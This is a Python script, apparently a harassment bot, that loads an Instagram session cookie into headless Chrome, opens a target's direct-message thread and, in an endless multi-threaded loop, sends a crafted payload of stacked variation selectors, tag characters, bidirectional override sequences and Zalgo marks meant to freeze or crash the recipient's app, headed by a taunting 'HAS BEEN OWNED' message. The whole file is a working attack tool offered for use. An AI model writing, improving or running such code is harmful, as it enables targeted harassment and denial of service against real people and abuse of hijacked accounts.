# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (K-PANEL STABLE)
# 📅 STATUS: GPU-POISONING | UNBUFFERED LOGS | 10 AGENTS

import os, time, random, threading, sys, gc, tempfile
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- MATRIX CONFIG ---
THREADS = 2
SESSION_LIMIT = 180 
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_kpanel_payload(target_name):
    """The K-PANEL: GPU-Cache Poisoning for 2026 Engines."""
    header = f"👑 PRAVEER PAPA 👑 SYSTEM ERROR: {target_name.upper()} HAS BEEN OWNED\n"
    
    # 💥 THE 'GPU-TRAP' (Variation Selector Stacking)
    gpu_trap = "\ufe0f\ufe0e" * 400 
    
    # 💥 THE 'FRAGMENTER' (Mismatched Tag Sequences)
    fragmenter = "\U000E007F" * 250
    
    # 💥 THE 'NON-BREAKING CLOG' (U+00A0)
    clog = "\u00A0" * 150 
    
    # 💥 THE 'RENDER-LOOP' (Unicode Isolate Depth)
    render_loop = "\u2068\u202E\u2069" * 70
    
    # 💥 THE 'VERTICAL STACK' (Triple-Type Zalgo)
    z_stack = "̸" * 45 + "̰" * 45 + "̵" * 45
    
    lines = [header, gpu_trap, fragmenter]
    for i in range(45):
        chaos = render_loop if i % 2 == 0 else render_loop[::-1]
        lines.append(f"{clog} {chaos} {target_name.upper()}_VOID {z_stack}")
    
    return "\n".join(lines)[:9900]

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new") 
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def run_life_cycle(agent_id, cookie, target_id, target_name):
    while True:
        driver = None
        try:
            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ K-PANEL INITIALIZED...", flush=True)
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(7)
            
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(12)

            session_start = time.time()
            while (time.time() - session_start) < SESSION_LIMIT:
                try:
                    box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                    
                    for _ in range(2):
                        payload = get_kpanel_payload(target_name)
                        driver.execute_script("""
                            var el = arguments[0];
                            document.execCommand('insertText', false, arguments[1]);
                            el.dispatchEvent(new Event('input', { bubbles: true }));
                        """, box, payload)
                        box.send_keys(Keys.ENTER)
                        time.sleep(0.5) 
                    
                    print(f"[M{MACHINE_ID}-A{agent_id}] 💀 IMPACT DELIVERED | {target_name.upper()} GONE", flush=True)
                    time.sleep(random.uniform(15, 20)) 
                    
                except:
                    time.sleep(5)
                    break 
        except Exception as e:
            print(f"[M{MACHINE_ID}-A{agent_id}] ⚠️ Restarting due to: {str(e)[:50]}", flush=True)
        finally:
            if driver: driver.quit()
            gc.collect()
            time.sleep(3)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    if not cookie or not target_id: sys.exit(1)
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
